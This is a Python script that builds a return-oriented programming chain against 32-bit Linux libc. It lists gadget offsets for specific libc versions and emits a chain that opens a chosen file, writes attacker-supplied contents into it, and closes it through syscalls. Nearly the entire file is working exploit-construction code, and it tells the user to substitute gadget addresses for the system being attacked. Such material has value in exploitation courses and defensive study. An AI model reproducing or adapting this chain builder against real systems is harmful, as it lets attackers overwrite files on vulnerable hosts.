import re
import sys

"""
This program is to create an ROP program to edit a specific file
"""

"""
These are the commands usually used to call execve on 32-bit systems
They've been tested on libc-2.15 and libc-2.17
Please change only the relative addresses of the gadgets to the ones on the system to be exploited.
"""

pop_ecx_pop_eax = ''
mov_eax_ecx = ''
pop_ebx_ret = ''
xor_eax_eax = ''
pop_ecx_pop_edx = ''
mov_pedx_eax_mov_eax_edx = ''
mov_edx_eax_mov_eax_edx = ''
mov_ebx_edx = ''
xor_edx_edx_mov_eax_edx = ''
mov_eax_0x2 = ''
mov_eax_0x4 = ''
mov_ecx_eax_mov_edx_ecx_pop_ebx = ''
inc_eax = ''
mov_eax_0x6 = ''
add_eax_0x4 = ''
add_eax_0x5 = ''
add_eax_0x8 = ''
add_eax_0x10 = ''
add_eax_0x20 = ''
add_eax_0x30 = ''
call_gs_10 = ''

rop_code = ''

offset = 4

def open_file():

    global rop_code
    global offset

    file_name = input('Enter the name of the file you\'d like to edit: ')

    if len(file_name) % 4 > 0:
        null_offset = len(file_name) % 4
        for i in range (0, 4 - len(file_name) % 4):
            file_name = file_name + 'a'
    else:
        null_offset = 4
    
    tokens = re.findall('....', file_name)

    for token in tokens:
        commands = [pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + mov_eax_ecx]
        commands[0] = commands[0] + '0x'
        token = token[::-1]
        for char in token:
            commands[0] = commands[0] + str(hex(ord(char)))[2:]
        token = token[::-1]
        commands[0] = commands[0] + ": " + token + '\\n'
        commands[1] = commands[1] + str(hex(offset))
        commands[3] = token + commands[3]
        rop_code = rop_code + ''.join(commands)
        offset = offset + 4

    null_offset = null_offset + offset - 4

    rop_code = rop_code + pop_ebx_ret + 'Address    : 0x4: Offset for ' + tokens[0] + ' (.data base)\\n'
    rop_code = rop_code + xor_eax_eax
    rop_code = rop_code + pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\nAddress    : ' + str(hex(null_offset)) + ': Offset for NULL (.data base)\\n'
    rop_code = rop_code + mov_pedx_eax_mov_eax_edx
    rop_code = rop_code + xor_edx_edx_mov_eax_edx
    rop_code = rop_code + pop_ecx_pop_edx + 'Padding    : 0x02020202: (To neutralize pop ecx)\\nAddress    : ' + str(hex(null_offset + 4)) + ': Offset for 0x2 (.data base)\\n'
    rop_code = rop_code + mov_eax_0x2
    rop_code = rop_code + mov_pedx_eax_mov_eax_edx
    rop_code = rop_code + mov_ecx_eax_mov_edx_ecx_pop_ebx + 'Address    : 0x4: Offset for ' + tokens[0] + ' (.data base)\\n'
    rop_code = rop_code + xor_edx_edx_mov_eax_edx
    rop_code = rop_code + add_eax_0x5
    rop_code = rop_code + call_gs_10


def write_file():

    global rop_code
    global offset

    rop_code = rop_code + mov_edx_eax_mov_eax_edx
    rop_code = rop_code + mov_ebx_edx

    file_name = input('What\'s the name of the file to read the contents from? ')

    contents = open(file_name, 'r').readlines()
    contents = ''.join(contents)

    if len(contents) % 4 > 0:
        null_offset = len(contents) % 4
        for i in range (0, 4 - len(contents) % 4):
            contents = contents + 'a'
    else:
        null_offset = 4

    tokens = re.findall('....', contents)

    offset = offset + 4
    content_offset = offset

    for token in tokens:
        commands = [pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + mov_eax_ecx]
        commands[0] = commands[0] + '0x'
        token = token[::-1]
        for char in token:
            commands[0] = commands[0] + str(hex(ord(char)))[2:]
        token = token[::-1]
        commands[0] = commands[0] + ": " + token + '\\n'
        commands[1] = commands[1] + str(hex(offset))
        commands[3] = token + commands[3]
        rop_code = rop_code + ''.join(commands)
        offset = offset + 4

    null_offset = null_offset + offset - 4

    rop_code = rop_code + xor_eax_eax
    rop_code = rop_code + pop_ecx_pop_edx + 'Address    : ' + str(hex(content_offset)) + ': Offset for Hack (.data base)\\nAddress    : ' + str(hex(null_offset)) + ': Offset for NULL (.data base)\\n'
    rop_code = rop_code + mov_pedx_eax_mov_eax_edx
    rop_code = rop_code + xor_edx_edx_mov_eax_edx

    contents_len = len(contents)

    mapping = { 48 : add_eax_0x30, 32 : add_eax_0x20, 16 : add_eax_0x10, 8 : add_eax_0x8, 4 : add_eax_0x4 }
    denominations = [48, 32, 16, 8, 4]

    for d in denominations:
        while contents_len / d > 0:
            rop_code = rop_code + mapping[d]
            if mapping[d] == add_eax_0x10 or mapping[d] == add_eax_0x20 or mapping[d] == add_eax_0x30:
                rop_code = rop_code + 'Padding    : 0x01010101: (To neutralize pop ecx)\\nPadding    : 0x01010101: (To neutralize pop ecx)\\n'
            contents_len = contents_len - d
    
    rop_code = rop_code + mov_edx_eax_mov_eax_edx
    rop_code = rop_code + mov_eax_0x4
    rop_code = rop_code + call_gs_10


def close_file():

    global rop_code

    rop_code = rop_code + mov_eax_0x6
    rop_code = rop_code + call_gs_10


def main():

    global pop_ecx_pop_eax
    global mov_eax_ecx
    global pop_ebx_ret
    global xor_eax_eax
    global pop_ecx_pop_edx
    global mov_pedx_eax_mov_eax_edx
    global mov_edx_eax_mov_eax_edx
    global mov_ebx_edx
    global xor_edx_edx_mov_eax_edx
    global mov_eax_0x2
    global mov_eax_0x4
    global mov_ecx_eax_mov_edx_ecx_pop_ebx
    global inc_eax
    global mov_eax_0x6
    global add_eax_0x4
    global add_eax_0x5
    global add_eax_0x8
    global add_eax_0x10
    global add_eax_0x20
    global add_eax_0x30
    global call_gs_10
    global rop_code
    global offset

    if len(sys.argv) == 2 and sys.argv[1] == 'ubuntu12.04-libc2.15':
       # TODO
        pop_ecx_pop_eax = ''

    else:
        pop_ecx_pop_eax = 'ROP command: 0xf5160L: pop ecx ; pop eax ;;\\n'
        mov_eax_ecx = 'ROP command: 0x2e09fL: mov [eax] ecx ;;\\n'
        pop_ebx_ret = 'ROP command: 0x742aeL: pop ebx ; ret ;\\n'
        xor_eax_eax = 'ROP command: 0x34964L: xor eax eax ;;\\n'
        pop_ecx_pop_edx = 'ROP command: 0x2e8bbL: pop ecx ; pop edx ;;\\n'
        mov_pedx_eax_mov_eax_edx = 'ROP command: 0x8e034L: mov [edx] eax ; mov eax edx ;;\\n'
        mov_edx_eax_mov_eax_edx = 'ROP command: 0x122339L: mov edx eax ; mov eax edx ;; \\n'
        mov_ebx_edx = 'ROP command: 0xdf572L: mov ebx edx ;;\\n'
        xor_edx_edx_mov_eax_edx = 'ROP command: 0x83f67L: xor edx edx ; mov eax edx ;;\\n'
        mov_eax_0x2 = 'ROP command: 0x1171f0L: mov eax 0x2 ;;\\n'
        mov_eax_0x4 = 'ROP command: 0xa9a10L: mov eax 0x4 ;;\\n'
        mov_ecx_eax_mov_edx_ecx_pop_ebx = 'ROP command: 0x143f2cL: mov ecx [eax] ; mov [edx] ecx ; pop ebx ;;\\n'
        mov_eax_0x4 = 'ROP command: 0xa9a10L: mov eax 0x4 ;;\\n'
        inc_eax = 'ROP command: 0x41e3aL: inc eax ;;\\n'
        mov_eax_0x6 = 'ROP command: 0xa9a30L: mov eax 0x6 ;;\\n'
        add_eax_0x4 = 'ROP command: 0x14da0cL: add eax 0x4 ;;\\n'
        add_eax_0x5 = 'ROP command: 0x14da10L: add eax 0x5 ;;\\n'
        add_eax_0x8 = 'ROP command: 0x113988L: add eax 0x8 ;;\\n'
        add_eax_0x10 = 'ROP command: 0x85238L: add eax 0x10 ; pop edi ; pop esi ;;\\n'
        add_eax_0x20 = 'ROP command: 0x85245L: add eax 0x20 ; pop edi ; pop esi ;;\\n'
        add_eax_0x30 = 'ROP command: 0x85252L: add eax 0x30 ; pop edi ; pop esi ;;\\n'
        call_gs_10 = 'ROP command: 0xbaa75L: call dword [gs:0x10] ;;\\n'

    open_file()
    write_file()
    close_file()

    print rop_code[:-2]


if __name__ == '__main__':
    main()